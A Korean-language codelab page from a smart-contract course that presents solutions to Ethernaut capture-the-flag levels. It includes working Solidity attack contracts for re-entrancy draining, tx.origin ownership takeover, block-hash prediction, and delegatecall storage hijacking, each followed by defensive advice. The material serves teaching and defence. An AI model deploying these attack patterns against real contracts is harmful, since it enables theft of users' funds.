
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <title>Week 4: 취약점 보완 및 테스트</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14" ga4id=""></google-codelab-analytics>
  <google-codelab codelab-gaid=""
                  codelab-ga4id=""
                  id="html"
                  title="Week 4: 취약점 보완 및 테스트"
                  environment="web"
                  feedback-link="">
    
      <google-codelab-step label="세션 소개" duration="5">
        <p>이번 세션에서는 Ethernaut 문제 풀이를 공유하며 스마트 컨트랙트 상의 주요 취약점을 함께 학습합니다. 이를 바탕으로 지난 세션까지 진행한 프로젝트의 보안 취약점을 점검하고 필요한 수정 작업을 진행합니다. 마지막으로, 수정된 기능들이 정상적으로 동작하는지 최종 테스트를 수행할 예정입니다.</p>
<h2 is-upgraded>목차</h2>
<h3 is-upgraded>1. Ethernaut 문제 풀이 공유</h3>
<p>Ethernaut 레벨을 바탕으로 취약점 재현 과정, 악용 시나리오, 안전한 방어 전략을 정리하고 학습합니다.</p>
<h3 is-upgraded>2. 프로젝트 취약점 점검</h3>
<p><code>CommitteeManager</code>, <code>LicenseManager</code> 등 핵심 컨트랙트와 관련 오프체인 서비스의 접근 제어, 재진입, 입력 검증 항목을 중심으로 취약점을 점검합니다.</p>
<h3 is-upgraded>3. 취약점 수정 및 개선 작업</h3>
<p>우선순위가 높은 취약점부터 컨트랙트 로직, 이벤트를 수정하고 코드 리뷰를 통해 개선 사항을 확정합니다.</p>
<h3 is-upgraded>4. 최종 테스트</h3>
<p>수정된 내용을 배포하고, 발행부터 복원까지 사용자 시나리오를 통합 테스트로 검증합니다.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Ethernaut 문제 풀이 공유" duration="60">
        <p>사전에 풀어온 Ethernaut 레벨을 바탕으로 풀이 과정을 발표하고, 각 취약점이 발생한 원인과 방어 전략을 함께 토론합니다. 동일한 유형이라도 구현 방식에 따라 대응책이 달라질 수 있으므로, 서로의 솔루션을 비교하면서 정리합시다.</p>
<p class="image-container"><img alt="No Spoilers" src="img/f1876fc335dfcfd0.png"></p>
<h2 is-upgraded>Fallback</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/1" target="_blank">Fallback</a>은 컨트랙트의 소유권을 탈취하고 잔액을 0으로 만드는 문제입니다.</p>
<p>fallback 함수는 컨트랙트에 정의되어 있지 않은 함수가 호출될 경우 자동으로 호출되는 함수입니다. 이 문제에서는 트랙젝션을 보내는 클라이언트쪽 함수 sendTransaction을 사용해 컨트랙트를 호출하고 컨트랙트에 대응되는 함수가 없어서 fallback 함수가 실행됩니다. 이 때, fallback함수 내에서 몇 가지 조건(contribute되어 있음, value가 있음)을 만족하면 owner를 바꿀 수 있습니다.</p>
<p class="image-container"><img alt="Fallback Contribute" src="img/1a9b46a544abf55c.png"></p>
<p>먼저, 0.001 ether이하의 금액을 contribute 해줍시다.</p>
<p class="image-container"><img alt="Fallback Attack" src="img/f237bb404b0d0fe7.png"></p>
<p>sendTraction을 필요한 설정값(from, to, value)를 담아 fallback함수를 실행해줍니다.</p>
<p class="image-container"><img alt="Fallback Tip" src="img/119508b01751de23.png"></p>
<p>이처럼 단순히 입금만 받는 함수에 권한 변경 로직을 넣으면 위험할 수 있습니다. 가능한 fallback에는 최소 로직만 넣어야 하고, 이벤트만 찍고 끝내는 것을 권장합니다.</p>
<aside class="special"><p><strong>TIP</strong> fallback 함수에는 fallback, receive 두 가지가 존재하는데, 메시지에 데이터(calldata)가 담겨 있으면 fallback이 호출되고, 비어있으면 receive가 호출됩니다. </p>
</aside>
<h2 is-upgraded>Fallout</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/1" target="_blank">Fallout</a>은 컨트랙트의 소유권을 탈취하는 문제입니다.</p>
<p>자세히 보면 스마트컨트랙트의 이름 <code>Fallout</code>과 생성자 함수의 이름 <code>Fal1out</code>이 다릅니다. 즉, <code>Fal1out</code>는 생성자가 아니라 함수입니다. 이 함수를 호출해서 소유권을 탈취합니다.</p>
<p class="image-container"><img alt="Fallout Solution" src="img/29737130e0103efc.png"></p>
<p class="image-container"><img alt="Fallout Tip" src="img/8ae79a1bb78f3438.png"></p>
<p>solidity 0.4 이하의 버전에서는 함수의 이름을 컨트랙트의 이름과 동일하게 지정을 해주면 생성자로 취급합니다. 오타에 의한 문제를 방지하기 위해 그 이후의 버전부터는 <code>contructor</code>를 사용해서 생성자를 정의할 수 있도록 바뀌었습니다. 업그레이드형 컨트랙트의 <code>initializer</code> modifier를 사용하여 contructor를 대체합니다.</p>
<pre><code language="language-solidity" class="language-solidity">contract FalloutLike is Initializable {
    address public owner;
    mapping(address =&gt; uint256) public allocations;

    function initialize(address _owner) public initializer payable {
        owner = _owner;
        allocations[owner] = msg.value;
    }
}
</code></pre>
<p>Proxy 생성 후, Proxy 주소로 initialize를 호출해야 합니다.</p>
<pre><code language="language-solidity" class="language-solidity">await FalloutLikeAtProxy.initialize(player, { value: ... });
</code></pre>
<aside class="special"><p><strong>스마트 컨트랙트의 업그레드를 위한 전략</strong></p>
<p><strong>1. Contract migration</strong>: 새로운 스마트컨트랙트를 생성하고 이전 스마트컨트랙트의 상태정보를 마이그레이션하는 패턴입니다.</p>
<p><strong>2. Data separation</strong>: 비즈니스로직과 상태정보들을 분리하는 패턴입니다.</p>
<p><strong>3. Proxy patterns</strong>: 하지 않는 (immutable) 프록시 컨트랙트의 delegate 함수를 호출하여 수정된 비즈니스 스마트컨트랙트를 호출하는 패턴입니다. </p>
<p><strong>4. Strategy pattern</strong>: 메인 스마트컨트랙트에는 변하지 않을 코어 비즈니스 로직을 구현하고, 나머지는 satellite(위성 컨트랙트)의 인터페이스를 활용해서 특정 기능을 수행하는 패턴. Proxy patterns 와 비슷하지만 로직을 가지고 있다는 점에서 차이점이 있습니다. </p>
<p><strong>5. Diamond pattern</strong>: Proxy patterns의 개선된 버전으로, delegate 함수를 이용해서 한개 이상의 로직 컨트랙트를 호출합니다. 비즈니스 로직 컨트랙트를 여기에서는 facet(패싯)이라고 부릅니다. proxy 컨트랙트에는 호출할 서로 다른 facet의 address를 알기 위해서 function selector를 반드시 구현해 두어야 합니다.</p>
</aside>
<h2 is-upgraded>Coin Flip</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/3" target="_blank">Coin Flip</a>은 동전 던지기의 결과를 10번 연속으로 맞추는 문제입니다. 동전의 결과는 <code>coinFlip</code> 변수 값에 결정되고 이는 <code>blockValue</code>를 <code>FACTOR</code>로 나눈 값입니다. <code>FACTOR</code>는 고정된 값이고 <code>blockValue</code>는 block.number - 1를 해시한 값이므로 Flip은 <code>block.number</code>에 의해 결정됩니다.</p>
<p>block.number는 <strong>현재 실행된 트랜잭션이 포함된 블록의 번호</strong> 입니다. 배포된 컨트랙트의 블록의 번호는 모두가 알 수 있고 이 번호를 가지고 같은 로직으로 시뮬레이션을 한다면 Flip값을 알 수 있습니다. 다음과 같이 공격할 컨트랙트를 짜주세요.</p>
<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    ICoinFlip public target;
    uint256 private FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        // CoinFlip이랑 동일하게 blockValue 계산
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip == 1);

        // 얻은 값을 얻어서 그대로 호출
        target.flip(side);
    }
}
</code></pre>
<p>contract의 address를 가져와서 Deploy할 때 인자로 넣어줍시다.</p>
<p class="image-container"><img alt="Coin Flip Address" src="img/977d9b5cddd39e78.png"></p>
<p class="image-container"><img alt="Coin Flip Deploy" src="img/fa37626e6236b943.png"></p>
<p>10번 Attack 트랜잭션 호출 후 제출합니다.</p>
<p class="image-container"><img alt="Coin Flip Attack" src="img/601ce23b91f65451.png"></p>
<h2 is-upgraded>Telephone</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/4" target="_blank">Telephone</a>은 컨트랙트의 소유권을 탈취하는 문제입니다. 컨트랙트를 살펴보면 <code>tx.origin</code>과 <code>msg.sender</code>가 서로 다를 때만 owner를 바꿉니다. <code>tx.origin</code>는 맨 처음 트랜잭션을 보낸 EOA(지갑 주소)입니다. 즉, 컨트랙트를 통해 changeOwner를 호출하면 owner를 변경할 수 있습니다.</p>
<p>다음과 같이 공격용 컨트랙트를 짜줍시다.</p>
<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _player) public {
        target.changeOwner(_player);
    }
}
</code></pre>
<p class="image-container"><img alt="Telephone Address" src="img/ba6e59aa2b8e13ca.png"></p>
<p>컨트랙트의 주소와 내 주소를 확인합니다.</p>
<p class="image-container"><img alt="Telephone Deploy" src="img/b1514132706f1ccf.png"></p>
<p class="image-container"><img alt="Telephone Attack" src="img/789e9ed401a89cc6.png"></p>
<p>Telephone 컨트랙트 주소를 넣어 배포하고 Attack 트랜잭션을 호출합니다.</p>
<p class="image-container"><img alt="Telephone Tip" src="img/75aa549b6512ac2a.png"></p>
<p>tx.origin을 권한 체크에 쓰면, 누군가 나를 속여서 공격 컨트랙트를 호출하게 만들었을 때 그 컨트랙트가 내 지갑 주소를 가장해서 내 자산을 마음대로 빼갈 수 있습니다. 그래서 OpenZeppelin, ConsenSys 등의 감사기관이 권한 체크, 자산 전송, 보안 관련 로직에 <code>tx.origin</code>을 사용하는 것을 금지합니다.</p>
<h2 is-upgraded>Token</h2>
<ul>
<li><strong>Token</strong></li>
</ul>
<p><a href="https://ethernaut.openzeppelin.com/level/5" target="_blank">Token</a>은 20개의 토큰을 받은 상태에서 가능한 한 많은 토큰을 탈취하는 문제입니다.</p>
<pre><code language="language-solidity" class="language-solidity">function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value &gt;= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
</code></pre>
<p>transfer 함수를 봅시다. <code>balances[msg.sender] - _value</code>에서 underflow가 발생하면 require를 통과하게 되고 동일하게  <code>balances[msg.sender] -= _value;</code>가 발생하여 비정상적인 값이 발생할 수 있습니다. 이때, 다시 더하는 <code>_to</code>만 다른 주소로 설정하면 msg.sender의 금액은 정상적인 값으로 복구되지 않습니다.</p>
<p class="image-container"><img alt="Token solution" src="img/f23c69b3f5623482.png"></p>
<p>Solidity 0.8 이전 버전에서 underflow는 기본적으로 허용되어 있습니다. 최신 컴파일러의 내장 SafeMath, 혹은 OpenZeppelin의 <code>SafeMath</code> 라이브러리와 <code>require</code> 검증을 병행해야 합니다.</p>
<p class="image-container"><img alt="Token Tip" src="img/f0da11eb2df66ba4.png"></p>
<p>최신 버전에서 underflow를 허용하려면 unchecked를 사용하면 됩니다.</p>
<pre><code language="language-solidity" class="language-solidity">function unsafeDecrement(uint8 amount) public {
    // myNumber가 10이므로 11을 빼려고 하면 언더플로우 발생
    unchecked {
        // 이 블록 안에서는 안전 장치가 해제됩니다.
        // myNumber는 (10 - 11)이 되어 255로 순환합니다.
        myNumber = myNumber - amount;
    }
}
</code></pre>
<h2 is-upgraded>Re-entrancy</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/10" target="_blank">Re-entrancy</a>은 컨트랙트의 모든 계정을 탈취하는 문제입니다.</p>
<p>withdraw함수를 보면 인출할 금액이 있는지 검사하고 <code>msg.sender.call</code>을 이용해 sender의 콜백함수를 실행합니다. 그 다음에 잔고를 줄이는 것을 확인할 수 있습니다. 이때, 공격자가 콜백 함수에 receive()를 만들고 그 안에서 다시 withdraw를 호출할 수 있습니다. 실제 상태 반영은 이루어지기 전에 콜백함수가 실행되어 잔고가 줄지 않아 여러 번 인출이 가능합니다. 다음과 같이 공격 컨트랙트를 작성하면 됩니다.</p>
<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint);
}

contract Attack {
    IReentrance public target;
    address public owner;
    uint public attackAmount;

    constructor(address _target) public {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    // 공격 시작용 함수
    function attack() external payable {
        require(msg.value &gt; 0, &#34;need ether to attack&#34;);
        attackAmount = msg.value;

        // 컨트랙트에게 기부해서 target에 잔고를 만들어둠
        target.donate{value: msg.value}(address(this));

        // 첫 withdraw 호출
        target.withdraw(attackAmount);
    }

    // target이 돈 보내줄 때마다 실행됨
    receive() external payable {
        uint targetBalance = address(target).balance;

        if (targetBalance &gt;= attackAmount) {
            // 아직 돈이 남아 있으면 다시 똑같은 amount 만큼 withdraw 계속
            target.withdraw(attackAmount);
        } else if (targetBalance &gt; 0) {
            // 남은 게 attackAmount보다 적으면 남은 거 싹 다 뽑기
            target.withdraw(targetBalance);
        } else {
            // 다 털었으면 내 EOA로 빼가기
            payable(owner).transfer(address(this).balance);
        }
    }
}
</code></pre>
<p>공격할 인스턴스 주소 확인를 확인하고 Attack 컨트랙트를 생성할 때 주소를 넣어줍니다.</p>
<p class="image-container"><img alt="Re-entrancy Address" src="img/88b398137a95541d.png"></p>
<p class="image-container"><img alt="Re-entrancy Deploy" src="img/e8df199cd99760cc.png"></p>
<p>공격함수를 호출할 때 value를 적당히 넣어주어 초기에 맡길 금액을 설정하고 함수를 실행합니다.</p>
<p class="image-container"><img alt="Re-entrancy Attack" src="img/63f3535b9a131cf1.png"></p>
<p>제대로 재진입 공격이 먹혔는지 Attack 컨트랙트가 가진 금액을 확인합니다.</p>
<p class="image-container"><img alt="Re-entrancy Result" src="img/8fb716db28b4b1aa.png"></p>
<p>탈취한 것이 확인되었으면 제출합니다. 재진입 공격을 방지하기 위해 Checks-Effects-Interactions 패턴을 사용해야 합니다. 먼저 조건을 검증하고 바로 상태를 업데이트를 해야합니다. 그 이후 외부 함수를 호출할 수 있도록 구성해야합니다. 혹은 Mutex 패턴을 사용해야 합니다. Mutex는 여러 개체가 동일한 자원에 동시에 접근하는 것을 제한하기 위한 매커니즘으로, 특정 자원에 대한 락(lock)을 걸어 재진입 공격을 방지합니다.</p>
<pre><code language="language-solidity" class="language-solidity">bool private locked;

modifier noReentrant() {
    require(!locked, &#34;No re-entrancy&#34;);
    locked = true;
    _;
    locked = false;
}
</code></pre>
<p class="image-container"><img alt="Re-entrancy Tip" src="img/512c7c56dd105c91.png"></p>
<h2 is-upgraded>Elevator</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/11" target="_blank">Elevator</a>은 빌딩의 꼭대기에 도달하는 문제입니다. 컨트랙트에 보면 top이라는 boll 타입의 변수가 있는데 이 값을 true로 바꾸면 됩니다.</p>
<p>컨트랙트에서 goTo 함수를 호출하면 그 컨트랙트의 주소(<code>msg.sender</code>)를 Building 타입으로 보고 <code>isLastFloor()</code>를 호출한다. 우리는 Building interface와 동일한 컨트랙트를 통해 top을 true로 바꿀 것이다.</p>
<p><code>isLastFloor</code>는 <code>goTo</code> 함수 내에서 두 번 호출된다. 처음은 조건 검사이고 두 번째는 top을 변경하기 위한 용도이다. 처음 <code>isLastFloor</code>가 호출되었을 때 false이고 그 다음 호출되기 전에 true라면 top은 true로 바뀔 수 있다. Build의 isLastFloor가 다음과 같이 동작하도록 구현하면 된다.</p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IElevator {
    function goTo(uint _floor) external;
}

interface IBuilding {
    function isLastFloor(uint) external returns (bool);
}

contract Building is IBuilding {
    IElevator public target;
    bool private toggle;

    constructor(address _elevator) {
        target = IElevator(_elevator);
        toggle = false;
    }

    // Elevator가 두 번 호출하는 함수
    function isLastFloor(uint) external override returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        } else {
            return true;
        }
    }

    function attack(uint _floor) external {
        target.goTo(_floor);
    }
}
</code></pre>
<p>먼저 Elvator 컨트랙트를 주소를 받아와 Building을 배포할 때 인자로 넘겨준다.</p>
<p class="image-container"><img alt="Elevator Address" src="img/4e1f2eded75b21f.png"></p>
<p class="image-container"><img alt="Elevator Deploy" src="img/9cc3ac380912070e.png"></p>
<p>이후, Attack 함수를 호출해 공격한다. 이때 인자는 이동할 층으로, 아무 값이나 상관없다.</p>
<p class="image-container"><img alt="Elevator Attack" src="img/4e1f2eded75b21f.png"></p>
<p>정상적으로 top이 true로 변경했는지 확인한다. true이면 제출하면 된다.</p>
<p class="image-container"><img alt="Elevator Solution" src="img/9cc3ac380912070e.png"></p>
<p>이 문제는 <code>isLastFloor</code>라는 함수가 순수(pure)하게 동작하지 않았기 때문에 발생한 문제입니다. <code>isLastFloor</code>는 입력에 따라 마지막 층인지만 확인하고 그 결과를 반환해야 하는데 실제론 toggle이라는 상태를 가지고 상태에 따라 반환값이 달라지게 구현하였습니다. 즉, 실제로 pure하게 동작해야 하는데 외부 컨트랙트를 통해 그렇지 않게 동작하였습니다.</p>
<p>이를 막기 위해 함수의 정의(interface)에서 어떤 역할을 하는지 명시적으로 알려줄 필요가 있고 상태를 변경하지 않는 함수라면 view나 pure를 사용해야 합니다.</p>
<p class="image-container"><img alt="Elevator Tip" src="img/ff3488b2adfce8f8.png"></p>
<h2 is-upgraded>Preservation</h2>
<p><a href="https://ethernaut.openzeppelin.com/level/15" target="_blank">Preservation</a>은 서로 다른 두 개의 시간대(timezone)에 대한 시간을 저장하기 위한 라이브러리를 사용한다. 생성자는 각각의 시간을 저장하기 위해 두 개의 라이브러리 인스턴스를 생성한다. 여기서 목표는 주어진 컨트랙트의 소유권을 탈취하는 것입니다.</p>
<p>delegatecall은 호출된 컨트랙트의 코드를 현재 컨트랙트의 storage layout 기준으로 실행합니다. 각 Library의 storedTime은 slot 0에 있고 Preservation의 slot 0은 timeZone1Library 주소 이기 때문에 첫 번째 delegatecall을 이용해 timeZone1Library 주소를 원하는 값으로 덮어쓸 수 있습니다. 다음과 같이 공격 컨트랙트를 작성해주세요.</p>
<pre><code language="language-solidity" class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackPreservation {
    // 동일한 slot layout
    address public timeZone1Library; // slot0
    address public timeZone2Library; // slot1
    address public owner;            // slot2
    uint256 public storedTime;       // slot3

    function setTime(uint256 _time) public {
        owner = tx.origin; // tx.origin은 player
    }
}
</code></pre>
<p class="image-container"><img alt="Preservation Deploy" src="img/516bf54470705517.png"></p>
<p>컨트랙트를 배포하고 주소값을 받아와 주세요.</p>
<p class="image-container"><img alt="Preservation Solution" src="img/333875e6f18a8eeb.png"></p>
<p>먼저 <code>setFirstTime</code>을 호출할 때 공격 컨트랙트 주소를 전달해 첫 번째 타임존 라이브러리를 공격 컨트랙트로 바꿔주세요. 다시 <code>setFirstTime</code>을 호출해 공격 컨트랙트를 실행해주세요.</p>
<p class="image-container"><img alt="Preservation Tip" src="img/1ca236d4e2095d90.png"></p>
<aside class="special"><p><strong>TIP </strong>Storage slot</p>
<p> Storage를 구성하는 32바이트(256비트)짜리 저장 공간 블록입니다. Solidity 컴파일러는 각 상태 변수를 slot에 순서대로 매핑해두고 접근합니다. 값이 32바이트보다 작으면 packing(32바이트로 채움) 됩니다.</p>
</aside>
<p>uint256, address, bool 전부 결국 32바이트 슬롯에 저장되기 때문에 <code>setFirstTime</code>의 인자로 주소를 넘겨도 정상적으로 실행됩니다. 이때, delegatecall처럼 다른 컨트랙트의 코드가 실행돼도 저장될 슬롯은 그대로 유지되므로(context-preserving) 취약점 발생할 수 있습니다.</p>
<p>delegatecall을 사용할 때는 context preserving 된다는 시실과 storage 변수들이 어떻게 저장되고 접근되는지 이해가 필요하다.</p>


      </google-codelab-step>
    
      <google-codelab-step label="프로젝트 취약점 점검" duration="10">
        

      </google-codelab-step>
    
      <google-codelab-step label="취약점 수정 및 개선 작업" duration="20">
        

      </google-codelab-step>
    
      <google-codelab-step label="최종 테스트" duration="19">
        

      </google-codelab-step>
    
      <google-codelab-step label="축하합니다" duration="1">
        <p>축하합니다! Ethernaut에서 다룬 대표적인 온체인 취약점을 복습하고, 프로젝트 컨트랙트의 보안 취약점을 실제로 찾아내어 패치하는 방법을 익혔습니다. 또한 보안 패치가 정상 동작하는지 테스트·배포 파이프라인으로 검증하는 경험을 쌓았습니다. 4주 동안 수고하셨습니다!</p>
<h2 is-upgraded>요약</h2>
<ul>
<li>이더리움 아키텍처(EVM, 계정, 가스)를 이해하였습니다.</li>
<li>기본 Solidity 문법, Remix/Hardhat 환경 세팅, 간단한 컨트랙트 배포·테스트 흐름을 익혔습니다.</li>
<li>프로젝트 요구사항을 바탕으로 폴더 구조와 인터페이스를 정의할 수 있습니다.</li>
<li>코드 등록·라이선스 발급·실행 요청 로직을 갖춘 핵심 스마트 컨트랙트를 작성해 Sepolia에 배포할 수 있습니다.</li>
<li>IPFS와 Shamir&#39;s Secret Sharing 동작을 이해하였습니다.</li>
<li>Ethernaut를 통해 자주 발생하는 온체인 취약점 패턴을 학습했습니다.</li>
</ul>
<h2 is-upgraded>도움이 될 만한 자료</h2>
<ol type="1">
<li><a href="https://www.litprotocol.com/" target="_blank">Lit Protocol</a>: Lit Protocol은 key와 secrets을 관리하기 위한 탈중앙화 네트워크 프로토콜입니다. 본 프로젝트는 이러한 Lit Protocol에서 영감을 받아, DKG(Distributed Key Generation) 개념을 기반으로 이를 솔리디티로 구현하였습니다. Lit Protocol에 대한 보다 자세한 내용은 <a href="https://github.com/LIT-Protocol/whitepaper" target="_blank">공식 백서</a>를 참고하시기 바랍니다.</li>
<li><a href="https://docs.ipfs.tech/concepts/" target="_blank">IPFS Concepts</a>: <a href="https://github.com/ipfs" target="_blank">IPFS</a>는 Web3 생태계에서는 중대형 오픈소스 프로젝트입니다. 또한, 이에 대한 구현 원리를 이해하기 위해서 Merkle DAG, UnixFS, DHT, Pub/Sub 모델(Gossip), BitSwap 등 Computer Sicence 관련 배경지식을 많이 요구합니다.</li>
<li><a href="https://proto.school/tutorials" target="_blank">proto school</a>: IPFS나 filecoin과 같은 분산형 웹 스토리지 시스템에 관한 기술 튜토리얼입니다.</li>
<li><a href="https://medium.com/@sineta01/sharmirs-secret-sharing%EC%9D%84-%EC%82%B4%ED%8E%B4%EB%B3%B4%EC%9E%90-eca906e17a4c" target="_blank">Sharmir&#39;s Secret Sharing</a>: 샤미르 분산 공유(Sharmir&#39;s Secret Sharing)에 관한 설명입니다.</li>
</ol>
<h2 is-upgraded>참고 자료</h2>
<ol type="1">
<li><a href="https://ethernaut.openzeppelin.com" target="_blank">Ethernaut</a></li>
<li><a href="https://piatoss3612.tistory.com/category/Solidity/Hacking" target="_blank">Ethernaut 풀이</a></li>
</ol>


      </google-codelab-step>
    
  </google-codelab>

  <script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
  <script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
  <script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
  <script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
  <script src="//support.google.com/inapp/api.js"></script>

</body>
</html>
